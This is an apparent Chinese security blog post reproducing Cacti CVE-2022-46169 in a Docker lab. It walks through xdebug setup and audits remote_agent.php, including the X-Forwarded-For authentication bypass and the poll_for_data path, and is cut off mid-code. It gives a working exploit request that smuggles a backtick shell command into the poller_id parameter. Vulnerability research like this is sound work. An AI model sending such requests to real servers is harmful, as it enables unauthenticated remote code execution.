<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="cacti CVE-2022-46169"><meta name="keywords" content="RCE,代码审计"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>cacti CVE-2022-46169【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {},
  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
  twikoo: {},
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9B%9E%E6%98%BE"><span class="toc-number">3.</span> <span class="toc-text">如何回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color7"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">20</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">14</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">2</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">cacti CVE-2022-46169</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-07-25 | 更新于 2025-08-25</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/RCE/">RCE</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div></div></div><div class="main-content"><p>CVE-2022-46169 的rce 漏洞复现</p>
<span id="more"></span>

<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>我们在docker环境内配置</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725134750077.png" alt="image-20250725134750077"></p>
<p>然后我们在vs code连接docker容器</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725135718151.png" alt="image-20250725135718151"></p>
<p>现在需要配置xdebug，等会方便我们追代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pecl install xdebug-3.1.6</span><br><span class="line">运行安装 xdebug</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line">启用 xdebug 扩展</span><br><span class="line"></span><br><span class="line">在/usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini，添加如下内容：</span><br><span class="line"></span><br><span class="line">zend_extension=xdebug</span><br><span class="line">xdebug.mode=debug</span><br><span class="line">xdebug.start_with_request=yes</span><br></pre></td></tr></table></figure>



<p>这个添加需要我们在vs code中完成</p>
<p>然后我们需要重启一下容器</p>
<p><code>docker restart edf5255aa17d</code></p>
<p>然后重新连接即可</p>
<p>完成后我们就可以愉快的调试了</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725142041390.png" alt="image-20250725142041390"></p>
<p>没问题断下来了</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725141447174.png" alt="image-20250725141447174"></p>
<p>我们还需要创建一个采集器</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725141537182.png" alt="image-20250725141537182"></p>
<p>然后我们就可以退出登录了</p>
<p>避免session的影响</p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>我么的漏洞利用点在<code>/remote_agent.php</code></p>
<p>因为我们有payload ，直接下断。传入看一下整个流程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`touch+/tmp/success`</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>



<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185549794.png" alt="image-20250725185549794"></p>
<p>断下来了</p>
<p>往下追</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185633322.png" alt="image-20250725185633322"></p>
<p>这里发现有一个鉴权函数，我们进去看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remote_client_authorized</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$poller_db_cnn_id</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* don&#x27;t allow to run from the command line */</span></span><br><span class="line">	<span class="variable">$client_addr</span> = <span class="title function_ invoke__">get_client_addr</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$client_addr</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$client_addr</span>, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;ERROR: Invalid remote agent client IP Address.  Exiting&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$client_name</span> = <span class="title function_ invoke__">gethostbyaddr</span>(<span class="variable">$client_addr</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$client_name</span> == <span class="variable">$client_addr</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;NOTE: Unable to resolve hostname from address &#x27;</span> . <span class="variable">$client_addr</span>, <span class="literal">false</span>, <span class="string">&#x27;WEBUI&#x27;</span>, POLLER_VERBOSITY_MEDIUM);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$client_name</span> = <span class="title function_ invoke__">remote_agent_strip_domain</span>(<span class="variable">$client_name</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$pollers</span> = <span class="title function_ invoke__">db_fetch_assoc</span>(<span class="string">&#x27;SELECT * FROM poller&#x27;</span>, <span class="literal">true</span>, <span class="variable">$poller_db_cnn_id</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">cacti_sizeof</span>(<span class="variable">$pollers</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$pollers</span> <span class="keyword">as</span> <span class="variable">$poller</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">remote_agent_strip_domain</span>(<span class="variable">$poller</span>[<span class="string">&#x27;hostname&#x27;</span>]) == <span class="variable">$client_name</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125; <span class="keyword">elseif</span> (<span class="variable">$poller</span>[<span class="string">&#x27;hostname&#x27;</span>] == <span class="variable">$client_addr</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">cacti_log</span>(<span class="string">&quot;Unauthorized remote agent access attempt from <span class="subst">$client_name</span> (<span class="subst">$client_addr</span>)&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们发现，<code>$client_addr = get_client_addr();</code> 直接通过这个函数来获取的ip地址，我们继续进去看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_addr</span>(<span class="params"><span class="variable">$client_addr</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$http_addr_headers</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;X-Forwarded-For&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;X-Client-IP&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;X-Real-IP&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;X-ProxyUser-Ip&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;CF-Connecting-IP&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;True-Client-IP&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HTTP_X_CLUSTER_CLIENT_IP&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_ADDR&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$client_addr</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$http_addr_headers</span> <span class="keyword">as</span> <span class="variable">$header</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="variable">$header</span>])) &#123;</span><br><span class="line">			<span class="variable">$header_ips</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="variable">$header</span>]);</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable">$header_ips</span> <span class="keyword">as</span> <span class="variable">$header_ip</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$header_ip</span>)) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$header_ip</span>, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">						<span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;ERROR: Invalid remote client IP Address found in header (&#x27;</span> . <span class="variable">$header</span> . <span class="string">&#x27;).&#x27;</span>, <span class="literal">false</span>, <span class="string">&#x27;AUTH&#x27;</span>, POLLER_VERBOSITY_DEBUG);</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="variable">$client_addr</span> = <span class="variable">$header_ip</span>;</span><br><span class="line">						<span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;DEBUG: Using remote client IP Address found in header (&#x27;</span> . <span class="variable">$header</span> . <span class="string">&#x27;): &#x27;</span> . <span class="variable">$client_addr</span> . <span class="string">&#x27; (&#x27;</span> . <span class="variable">$_SERVER</span>[<span class="variable">$header</span>] . <span class="string">&#x27;)&#x27;</span>, <span class="literal">false</span>, <span class="string">&#x27;AUTH&#x27;</span>, POLLER_VERBOSITY_DEBUG);</span><br><span class="line">						<span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$client_addr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185824538.png" alt="image-20250725185824538"></p>
<p>这里看起来就是 依次取了这些请求头，然后将他放进下面取依次循环</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185921203.png" alt="image-20250725185921203"></p>
<p>这里用循环来判断ip是否合法</p>
<p>但是他这里直接break 2，跳出两层循环，</p>
<p>所以他一旦找到了一个合法的ip。他就会跳出循环直接将当前的ip赋值给<code>client_addr</code></p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725191132752.png" alt="image-20250725191132752"></p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725191513139.png" alt="image-20250725191513139"></p>
<p>当我们不赋值的时候，他读取的REMOTE_ADDR 在我们设置的HTTP_X_FORWARDED_FOR的后面所以</p>
<p>他获取到了ip后就直接跳出了，127.0.0.1 ，合法 ，绕过了这个鉴权函数</p>
<p>重新下断到</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725191653328.png" alt="image-20250725191653328"></p>
<p>进入分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_default_action</span>(<span class="params"><span class="variable">$default</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">isset_request_var</span>(<span class="string">&#x27;action&#x27;</span>)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">set_request_var</span>(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$default</span>);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="title function_ invoke__">get_nfilter_request_var</span>(<span class="string">&#x27;action&#x27;</span>))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">read_config_option</span>(<span class="string">&#x27;log_validation&#x27;</span>) == <span class="string">&#x27;on&#x27;</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;WARNING: Request variable \&#x27;action\&#x27; was passed as array in &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] . <span class="string">&#x27;.&#x27;</span>, <span class="literal">false</span>, <span class="string">&#x27;WEBUI&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">set_request_var</span>(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>]);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_ invoke__">set_request_var</span>(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是对action做了处理</p>
<p>如果传入的action不正常，那么就会做如下处理</p>
<p>不允许传入数组，且必须要有参数</p>
<p>如果传入数组，那么就会提交日志，记录这是异常行为</p>
<p>所以这里我们需要传入正常的字符串</p>
<p>因为我们利用点 在后面那个pro 函数执行的地方，所以我们要进入</p>
<p><code>case &#39;polldata&#39;:</code> 这个分支</p>
<p>也就是为什么，我们的action要传入<code>polldata</code> 这个值</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725192557671.png" alt="image-20250725192557671"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poll_for_data</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$local_data_ids</span> = <span class="title function_ invoke__">get_nfilter_request_var</span>(<span class="string">&#x27;local_data_ids&#x27;</span>);</span><br><span class="line">	<span class="variable">$host_id</span>        = <span class="title function_ invoke__">get_filter_request_var</span>(<span class="string">&#x27;host_id&#x27;</span>);</span><br><span class="line">	<span class="variable">$poller_id</span>      = <span class="title function_ invoke__">get_nfilter_request_var</span>(<span class="string">&#x27;poller_id&#x27;</span>);</span><br><span class="line">	<span class="variable">$return</span>         = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">cacti_sizeof</span>(<span class="variable">$local_data_ids</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$local_data_ids</span> <span class="keyword">as</span> <span class="variable">$local_data_id</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">input_validate_input_number</span>(<span class="variable">$local_data_id</span>);</span><br><span class="line"></span><br><span class="line">			<span class="variable">$items</span> = <span class="title function_ invoke__">db_fetch_assoc_prepared</span>(<span class="string">&#x27;SELECT *</span></span><br><span class="line"><span class="string">				FROM poller_item</span></span><br><span class="line"><span class="string">				WHERE host_id = ?</span></span><br><span class="line"><span class="string">				AND local_data_id = ?&#x27;</span>,</span><br><span class="line">				<span class="keyword">array</span>(<span class="variable">$host_id</span>, <span class="variable">$local_data_id</span>));</span><br><span class="line"></span><br><span class="line">			<span class="variable">$script_server_calls</span> = <span class="title function_ invoke__">db_fetch_cell_prepared</span>(<span class="string">&#x27;SELECT COUNT(*)</span></span><br><span class="line"><span class="string">				FROM poller_item</span></span><br><span class="line"><span class="string">				WHERE host_id = ?</span></span><br><span class="line"><span class="string">				AND local_data_id = ?</span></span><br><span class="line"><span class="string">				AND action = 2&#x27;</span>,</span><br><span class="line">				<span class="keyword">array</span>(<span class="variable">$host_id</span>, <span class="variable">$local_data_id</span>));</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">cacti_sizeof</span>(<span class="variable">$items</span>)) &#123;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">					<span class="keyword">switch</span> (<span class="variable">$item</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">					<span class="keyword">case</span> POLLER_ACTION_SNMP: <span class="comment">/* snmp */</span></span><br><span class="line">						<span class="keyword">if</span> ((<span class="variable">$item</span>[<span class="string">&#x27;snmp_version&#x27;</span>] == <span class="number">0</span>) || ((<span class="variable">$item</span>[<span class="string">&#x27;snmp_community&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &amp;&amp; (<span class="variable">$item</span>[<span class="string">&#x27;snmp_version&#x27;</span>] != <span class="number">3</span>))) &#123;</span><br><span class="line">							<span class="variable">$output</span> = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="variable">$host</span> = <span class="title function_ invoke__">db_fetch_row_prepared</span>(<span class="string">&#x27;SELECT ping_retries, max_oids FROM host WHERE hostname = ?&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$item</span>[<span class="string">&#x27;hostname&#x27;</span>]));</span><br><span class="line">							<span class="variable">$session</span> = <span class="title function_ invoke__">cacti_snmp_session</span>(<span class="variable">$item</span>[<span class="string">&#x27;hostname&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_community&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_version&#x27;</span>],</span><br><span class="line">								<span class="variable">$item</span>[<span class="string">&#x27;snmp_username&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_password&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_auth_protocol&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_priv_passphrase&#x27;</span>],</span><br><span class="line">								<span class="variable">$item</span>[<span class="string">&#x27;snmp_priv_protocol&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_context&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_engine_id&#x27;</span>], <span class="variable">$item</span>[<span class="string">&#x27;snmp_port&#x27;</span>],</span><br><span class="line">								<span class="variable">$item</span>[<span class="string">&#x27;snmp_timeout&#x27;</span>], <span class="variable">$host</span>[<span class="string">&#x27;ping_retries&#x27;</span>], <span class="variable">$host</span>[<span class="string">&#x27;max_oids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">							<span class="keyword">if</span> (<span class="variable">$session</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">								<span class="variable">$output</span> = <span 